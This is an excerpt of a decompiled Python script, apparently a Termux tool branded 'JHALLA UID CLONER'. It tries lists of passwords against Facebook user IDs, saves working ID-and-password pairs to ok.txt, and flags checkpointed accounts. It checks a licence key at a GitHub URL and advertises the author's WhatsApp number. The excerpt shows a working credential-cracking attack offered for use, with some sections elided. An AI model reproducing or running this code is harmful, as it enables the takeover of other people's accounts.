# Decompile by Jhalla Brand(Tools By Cobra-Linux Jhalla Brand)
# Dont ader restiment with JHALLA
# Decode file /- NA Cobra  3.11
# DECODE FILE VERSION - V.3.1.1
# WHATSAPP - +923435908309
import os
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (JHALLA) ")
time.sleep(5)
...
def helpnote():
	print("%s [*] FOLLOW ME ON FB PAGE To KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://github.com/Jhalla11/Aprrovl1/blob/main/Aprrovl1.txt"])
	exit(" [*] WHAT'S APP : https://wa.me/+923435908309")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHAT'S APP >> https://wa.me/+923435908309")
	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")
	subprocess.check_output(["am", "start", "https://wa.me/+923435908309"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Jhalla11/Aprrovl1/blob/main/Aprrovl1.txt').text
			if basesplit in plr:
				key = basesplit
		...
		runtxt("\n    \033[0;92m <=======    JHALLA﹏𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐄𝐑    =======>  \033[0;97m ")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [JHALLA-OK😽] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [JHALLA-CP😿] %s | %s\033[0;97m         "%(uid, pw))
